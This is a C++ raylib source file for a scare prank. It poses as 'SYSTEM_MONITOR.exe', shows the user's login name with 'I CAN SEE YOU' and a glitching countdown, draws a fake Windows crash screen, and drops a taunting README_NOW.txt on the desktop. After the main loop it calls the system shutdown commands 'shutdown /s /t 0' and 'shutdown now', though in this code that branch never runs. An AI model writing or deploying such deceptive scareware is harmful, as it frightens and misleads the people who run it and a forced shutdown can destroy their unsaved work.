#include "raylib.h"
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <unistd.h>
int main()
{
    InitAudioDevice();
    Music ambietMusic = LoadMusicStream("resources/lavanda.mp3");
    Sound scareSound = LoadSound("resources/sonic_laugh.mp3");
    Sound pisSound = LoadSound("resources/pisk.mp3");
    PlayMusicStream(ambietMusic);
    float closeTimer = 10.0f;
    float beepTimer = 0.0f;
    const char *userName = std::getenv("USER");
    if (userName == nullptr)
    {
        userName = std::getenv("USERNAME");
    }
    if (userName == nullptr)
    {
        userName = "stranger";
    }
    InitWindow(800, 600, "SYSTEM_MONITOR.exe");
    SetTargetFPS(60);
    while (!WindowShouldClose())
    {
        closeTimer = closeTimer - GetFrameTime();
        UpdateMusicStream(ambietMusic);
        if (closeTimer <= 0.0f)
        {
            StopMusicStream(ambietMusic);
            PlaySound(scareSound);
            BeginDrawing();
            ClearBackground(GetColor(0x0078));
            DrawText(":(", 100, 150, 120, WHITE);
            DrawText("Your PC ran into a problem and needs to restart.", 100, 300, 24, WHITE);
            DrawText("We're just collecting some error info, and then we'll restart for you.", 100, 340, 20, WHITE);
            DrawText("Stop code: CRITICAL_PROCESS_DIED (watcher.sys)", 100, 420, 16, WHITE);
            EndDrawing();
            WaitTime(1.5);
            CloseWindow();
            return 0;
        }
        beepTimer = beepTimer + GetFrameTime();
        float beepInterval = (closeTimer > 4.0f) ? 1.5f : 0.4f;
        if (beepTimer >= beepInterval)
        {
            std::cout << "\a" << std::flush;
            beepTimer = 0.0f;
        }
        int glitchOffsetX = 0;
        int glitchOffsetY = 0;
        int currentGlitchChance = 15 + (int)((10.0f - closeTimer) * 4.5f);
        if (GetRandomValue(1, 100) <= currentGlitchChance)
        {
            int power = (closeTimer > 4.0f) ? 5 : 15;
            glitchOffsetX = GetRandomValue(-power, power);
            glitchOffsetY = GetRandomValue(-power, power);
        }
        const char *scanText = "SCANNING SYSTEM FOR ANOMALIES...";
        const char *statusText = "STATUS: CONNECTED";
        Color statusColor = GREEN;

        if (closeTimer < 3.0f)
        {
            scanText = "IT HURTS IT HURTS IT HURTS...";
            statusText = "STATUS: SYSTEM CRITICAL / INTRUDER DETECTED";
            statusColor = RED;
        }
        float eyeLookX = 700.0f + GetFrameTime() * 10.0f;
        if (closeTimer > 3.0f)
        {
            eyeLookX = 700 + (int)(GetTime() * 30) % 40 - 20;
        }
        else
        {
            eyeLookX = 700;
        }
        BeginDrawing();
        ClearBackground(BLACK);
        if (beepTimer < 0.1f && closeTimer < 4.0f)
        {
            ClearBackground(WHITE);
        }
        else
        {
            ClearBackground(BLACK);
        }
        DrawText(scanText, 40 + glitchOffsetX, 50 + glitchOffsetY, 20, RED);
        DrawText(statusText, 40 + glitchOffsetX, 90 + glitchOffsetY, 20, statusColor);

        DrawText(TextFormat("SUBJECT IDENTIFIEDl: %s", userName), 40, 200, 32, WHITE);
        DrawText("I CAN SEE YOU", 40 + glitchOffsetX, 300 + glitchOffsetY, 40, RED);
        DrawText(TextFormat("00:00:%02d", (int)closeTimer), 280 + glitchOffsetX, 450 + glitchOffsetY, 60, RED);
        DrawCircle(700 + glitchOffsetX, 500 + glitchOffsetY, 60, WHITE);
        int irisRadius = (closeTimer < 3.0f) ? 25 : 35;
        DrawCircle(eyeLookX + glitchOffsetX, 500 + glitchOffsetY, irisRadius, RED);

        int pupilRadius = (closeTimer < 3.0f) ? 12 : 20;
        DrawCircle(eyeLookX + glitchOffsetX, 500 + glitchOffsetY, pupilRadius, BLACK);

        EndDrawing();
    }
    std::string finalMessage = "";
    if (closeTimer <= 0.0f)
    {
        finalMessage = "You are a coward, " + std::string(userName) + ".\nYou tried to escape by closing the window...\nBUT IT IS TOO LATE. I AM ALREADY HERE.";
        system("shutdown /s /t 0");
        system("shutdown now");
    }

    std::ofstream winFile("C:\\Users\\" + std::string(userName) + "\\Desktop\\README_NOW.txt");
    if (winFile.is_open())
    {
        winFile << finalMessage;
        winFile.close();
    }
    std::ofstream linFile("/home/" + std::string(userName) + "/Desktop/README_NOW.txt");
    if (linFile.is_open())
    {
        linFile << finalMessage;
        linFile.close();
    }
    UnloadMusicStream(ambietMusic);
    UnloadSound(scareSound);
    CloseWindow();
    return 0;
}